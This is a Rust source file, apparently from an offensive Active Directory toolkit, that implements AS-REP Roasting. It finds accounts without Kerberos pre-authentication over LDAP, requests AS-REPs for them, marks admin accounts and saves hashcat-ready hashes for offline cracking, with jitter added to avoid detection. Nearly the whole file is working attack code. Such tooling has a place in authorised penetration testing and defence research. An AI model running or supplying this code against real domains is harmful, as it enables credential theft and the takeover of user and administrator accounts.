//! AS-REP Roasting — Enumerate accounts with DONT_REQUIRE_PREAUTH and
//! extract crackable hashes (hashcat mode 18200).
//!
//! Flow:
//! 1. LDAP query for userAccountControl with DONT_REQ_PREAUTH (0x400000)
//! 2. Send AS-REQ without pre-auth for each target
//! 3. Extract encrypted part from AS-REP → hashcat/john format

use crate::runner::HuntConfig;
use colored::Colorize;
use indicatif::{ProgressBar, ProgressStyle};
use overthrone_core::error::Result;
use overthrone_core::proto::kerberos::{self, CrackableHash};
use overthrone_core::proto::ldap;
use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use tracing::{debug, info, warn};

// ═══════════════════════════════════════════════════════════
// UserAccountControl flag for DONT_REQUIRE_PREAUTH
// ═══════════════════════════════════════════════════════════

/// UAC bit: account does not require Kerberos pre-authentication
#[allow(dead_code)] // Protocol reference UAC flag
const UAC_DONT_REQ_PREAUTH: u32 = 0x00400000;
/// UAC bit: account is disabled
#[allow(dead_code)] // Protocol reference UAC flag
const UAC_ACCOUNT_DISABLE: u32 = 0x00000002;

// ═══════════════════════════════════════════════════════════
// Configuration
// ═══════════════════════════════════════════════════════════

#[derive(Debug, Clone)]
pub struct AsRepRoastConfig {
    /// Specific usernames to target (skip LDAP enumeration if provided)
    pub target_users: Vec<String>,
    /// Only roast enabled accounts
    pub skip_disabled: bool,
    /// Output file for hashes (one per line, hashcat-ready)
    pub output_file: Option<PathBuf>,
    /// Request with specific etype (default: RC4)
    pub preferred_etype: Option<i32>,
    /// Filter: only target users in specific OUs
    pub target_ous: Vec<String>,
}

impl Default for AsRepRoastConfig {
    fn default() -> Self {
        Self {
            target_users: Vec::new(),
            skip_disabled: true,
            output_file: None,
            preferred_etype: None,
            target_ous: Vec::new(),
        }
    }
}

// ═══════════════════════════════════════════════════════════
// Result
// ═══════════════════════════════════════════════════════════

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AsRepRoastResult {
    /// Crackable hashes obtained
    pub hashes: Vec<RoastedAccount>,
    /// Number of users checked
    pub users_checked: usize,
    /// Users that required pre-auth (not vulnerable)
    pub preauth_required: Vec<String>,
    /// Users that failed for other reasons
    pub errors: Vec<(String, String)>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RoastedAccount {
    pub username: String,
    pub domain: String,
    pub etype: i32,
    pub hash_string: String,
    pub distinguished_name: Option<String>,
    pub description: Option<String>,
    pub admin_count: bool,
}

// ═══════════════════════════════════════════════════════════
// LDAP Enumeration
// ═══════════════════════════════════════════════════════════

/// Discovered AS-REP roastable account from LDAP
#[derive(Debug, Clone)]
struct EnumeratedUser {
    sam_account_name: String,
    distinguished_name: String,
    description: Option<String>,
    admin_count: bool,
}

/// Enumerate users with DONT_REQ_PREAUTH via LDAP
async fn enumerate_asrep_users(config: &HuntConfig) -> Result<Vec<EnumeratedUser>> {
    info!("LDAP: Enumerating AS-REP roastable accounts");

    let mut conn = ldap::LdapSession::connect(
        &config.dc_ip,
        &config.domain,
        &config.username,
        &config.secret,
        config.use_ldaps,
    )
    .await?;

    let ad_users = conn.find_asrep_roastable().await?;

    let users: Vec<EnumeratedUser> = ad_users
        .iter()
        .map(|u| EnumeratedUser {
            sam_account_name: u.sam_account_name.clone(),
            distinguished_name: u.distinguished_name.clone(),
            description: u.description.clone(),
            admin_count: u.admin_count,
        })
        .collect();

    info!("LDAP: Found {} AS-REP roastable accounts", users.len());
    conn.disconnect().await?;
    Ok(users)
}

// ═══════════════════════════════════════════════════════════
// Core Roasting Logic
// ═══════════════════════════════════════════════════════════

/// Attempt to AS-REP roast a single user
async fn roast_single(
    dc_ip: &str,
    domain: &str,
    username: &str,
) -> std::result::Result<CrackableHash, (String, String)> {
    match kerberos::asrep_roast(dc_ip, domain, username).await {
        Ok(hash) => Ok(hash),
        Err(e) => {
            let err_str = e.to_string();
            if err_str.contains("PREAUTH_REQUIRED") || err_str.contains("KRB_ERROR 25") {
                Err((username.to_string(), "preauth_required".to_string()))
            } else {
                Err((username.to_string(), err_str))
            }
        }
    }
}

// ═══════════════════════════════════════════════════════════
// Public Runner
// ═══════════════════════════════════════════════════════════

/// Main entry point: enumerate + roast AS-REP vulnerable accounts
pub async fn run(config: &HuntConfig, ac: &AsRepRoastConfig) -> Result<AsRepRoastResult> {
    info!("{}", "═══ AS-REP ROAST ═══".bold().magenta());

    // Step 1: Get target list (from config or LDAP enum)
    let targets: Vec<(String, Option<String>, Option<String>, bool)> = if ac.target_users.is_empty()
    {
        let enumerated = enumerate_asrep_users(config).await?;
        enumerated
            .into_iter()
            .map(|u| {
                (
                    u.sam_account_name,
                    Some(u.distinguished_name),
                    u.description,
                    u.admin_count,
                )
            })
            .collect()
    } else {
        ac.target_users
            .iter()
            .map(|u| (u.clone(), None, None, false))
            .collect()
    };

    if targets.is_empty() {
        warn!("No AS-REP roastable accounts found");
        return Ok(AsRepRoastResult {
            hashes: Vec::new(),
            users_checked: 0,
            preauth_required: Vec::new(),
            errors: Vec::new(),
        });
    }

    // Step 2: Roast each target
    let pb = ProgressBar::new(targets.len() as u64);
    pb.set_style(
        ProgressStyle::default_bar()
            .template("{spinner:.yellow} [{bar:40.magenta/dim}] {pos}/{len} AS-REP roasting {msg}")
            .unwrap()
            .progress_chars("█▓░"),
    );

    let mut hashes = Vec::new();
    let mut preauth_required = Vec::new();
    let mut errors = Vec::new();

    for (username, dn, desc, admin_count) in &targets {
        pb.set_message(username.clone());

        match roast_single(&config.dc_ip, &config.domain, username).await {
            Ok(crackable) => {
                let roasted = RoastedAccount {
                    username: crackable.username.clone(),
                    domain: crackable.domain.clone(),
                    etype: kerberos::ETYPE_RC4_HMAC,
                    hash_string: crackable.hash_string,
                    distinguished_name: dn.clone(),
                    description: desc.clone(),
                    admin_count: *admin_count,
                };
                let marker = if *admin_count {
                    " [ADMIN]".red().bold().to_string()
                } else {
                    String::new()
                };
                info!(
                    " {} {} — {}{}",
                    "✓".green(),
                    username.bold(),
                    "hash obtained".green(),
                    marker
                );
                hashes.push(roasted);
            }
            Err((user, reason)) => {
                if reason == "preauth_required" {
                    debug!(" {} {} — preauth required", "✗".dimmed(), user);
                    preauth_required.push(user);
                } else {
                    warn!(" {} {} — {}", "✗".red(), user, reason);
                    errors.push((user, reason));
                }
            }
        }

        config.apply_jitter().await;
        pb.inc(1);
    }

    pb.finish_with_message("done");

    // Step 3: Save hashes to file
    if let Some(ref output_path) = ac.output_file {
        let hash_lines: String = hashes
            .iter()
            .map(|h| h.hash_string.as_str())
            .collect::<Vec<_>>()
            .join("\n");
        tokio::fs::write(output_path, &hash_lines).await?;
        info!("Saved {} hashes to {}", hashes.len(), output_path.display());
    }

    // Summary
    info!(
        "AS-REP Roast: {} hashes, {} preauth-required, {} errors",
        hashes.len().to_string().green(),
        preauth_required.len(),
        errors.len()
    );

    Ok(AsRepRoastResult {
        hashes,
        users_checked: targets.len(),
        preauth_required,
        errors,
    })
}
